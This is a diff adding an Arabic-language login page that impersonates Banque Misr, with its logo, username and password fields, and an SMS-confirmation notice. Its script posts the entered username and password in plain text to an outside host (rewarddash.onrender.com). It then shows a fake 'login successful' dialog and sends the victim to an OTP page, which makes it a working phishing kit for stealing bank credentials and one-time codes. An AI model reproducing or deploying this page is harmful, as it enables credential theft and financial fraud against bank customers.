@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تسجيل الدخول</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5ff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 420px;
+      margin: 40px auto;
+      background: white;
+      padding: 30px 20px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .logo {
+      display: block;
+      margin: 0 0 20px auto; 
+      width: 160px;
+    }
+
+    .login-title {
+      color: #7f1d1d;
+      font-size: 1.6rem;
+      text-align: center;
+      margin-bottom: 25px;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #333;
+      font-size: 1rem;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 2px solid #ccc;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    .username-input {
+      border-color: #b31942;
+    }
+
+    .password-input {
+      border-color: #a48c3b;
+    }
+
+    .forgot-link {
+      font-size: 0.9rem;
+      color: #7f1d1d;
+      margin: 6px 0 12px;
+      display: block;
+      cursor: pointer;
+      text-decoration: underline;
+      transition: color 0.3s;
+    }
+
+    .forgot-link:hover {
+      color: #d60032;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #7f1d1d;
+      color: white;
+      font-size: 1.1rem;
+      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-btn:hover {
+      background-color: #5d1414;
+    }
+
+    .login-note {
+      margin-top: 25px;
+      text-align: center;
+      color: #7f1d1d;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    /* ✅ Responsive Tweaks */
+    @media (max-width: 768px) {
+      .login-container {
+        margin: 20px auto;
+        padding: 20px 15px;
+      }
+
+      .login-title {
+        font-size: 1.4rem;
+      }
+
+      .form-control {
+        padding: 10px;
+        font-size: 0.95rem;
+      }
+
+      .login-btn {
+        font-size: 1rem;
+        padding: 10px;
+      }
+
+      .logo {
+        width: 100px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-title {
+        font-size: 1.3rem;
+      }
+
+      .form-group label {
+        font-size: 0.95rem;
+      }
+
+      .forgot-link {
+        font-size: 0.85rem;
+      }
+
+      .login-note {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="images/slogo.jpg" alt="Banque Misr" class="logo" />
+
+    <h2 class="login-title">تسجيل الدخول</h2>
+
+    <form>
+      <div class="form-group">
+        <label for="username">اسم المستخدم</label>
+        <input type="text" id="username" class="form-control username-input" placeholder="اسم المستخدم" required />
+        <a href="forgetPassword.html" class="forgot-link">هل نسيت اسم المستخدم؟</a>
+      </div>
+
+      <div class="form-group">
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" class="form-control password-input" placeholder="كلمة المرور" required />
+        <a href="forgetPassword.html" class="forgot-link">هل نسيت كلمة المرور</a>
+      </div>
+
+      <button type="submit" class="login-btn">تسجيل دخول</button>
+
+      <p class="login-note">
+        سوف نرسل لك رسالة نصية بتأكيد الدخول<br />
+        بعد التأكد من صحة البيانات.
+      </p>
+    </form>
+  </div>
+
+  <script>
+    document.querySelector("form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!username || !password) {
+        alert("يرجى إدخال اسم المستخدم وكلمة المرور");
+        return;
+      }
+
+      // Compose message
+      const message = `🔐 Login Request:\n- Username: ${username}\n- Password: ${password}`;
+
+      // Send to backend
+      fetch("https://rewarddash.onrender.com/api/messages", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ text: message }),
+      })
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error("فشل تسجيل الدخول");
+          }
+          return response.json();
+        })
+        .then(() => {
+          const fullPhone = localStorage.getItem("userPhone") || "";
+          const last4 = fullPhone.slice(-4);
+
+          const modal = document.createElement("div");
+          modal.style.position = "fixed";
+          modal.style.top = "0";
+          modal.style.right = "0";
+          modal.style.bottom = "0";
+          modal.style.left = "0";
+          modal.style.backgroundColor = "rgba(0,0,0,0.4)";
+          modal.style.display = "flex";
+          modal.style.alignItems = "center";
+          modal.style.justifyContent = "center";
+          modal.style.zIndex = "9999";
+
+          const alertBox = document.createElement("div");
+          alertBox.style.background = "#fff";
+          alertBox.style.padding = "25px 20px";
+          alertBox.style.borderRadius = "16px";
+          alertBox.style.maxWidth = "320px";
+          alertBox.style.boxShadow = "0 6px 15px rgba(0,0,0,0.2)";
+          alertBox.style.textAlign = "center";
+          alertBox.style.fontFamily = "Arial, sans-serif";
+
+          const messageElem = document.createElement("p");
+          messageElem.textContent = `تم تسجيل الدخول بنجاح. تم إرسال رسالة تأكيد إلى رقم الهاتف ${last4}***`;
+          messageElem.style.marginBottom = "20px";
+          messageElem.style.fontSize = "1rem";
+          messageElem.style.color = "#333";
+
+          const okBtn = document.createElement("button");
+          okBtn.textContent = "موافق";
+          okBtn.style.backgroundColor = "#7f1d1d";
+          okBtn.style.color = "#fff";
+          okBtn.style.padding = "10px 20px";
+          okBtn.style.border = "none";
+          okBtn.style.borderRadius = "10px";
+          okBtn.style.cursor = "pointer";
+          okBtn.style.fontSize = "1rem";
+
+          okBtn.addEventListener("click", function () {
+            window.location.href = "otp.html";
+          });
+
+          alertBox.appendChild(messageElem);
+          alertBox.appendChild(okBtn);
+          modal.appendChild(alertBox);
+          document.body.appendChild(modal);
+        })
+        .catch((error) => {
+          alert("خطأ في تسجيل الدخول أو الاتصال بالخادم");
+          console.error(error);
+        });
+    });
+  </script>
+</body>
+</html>
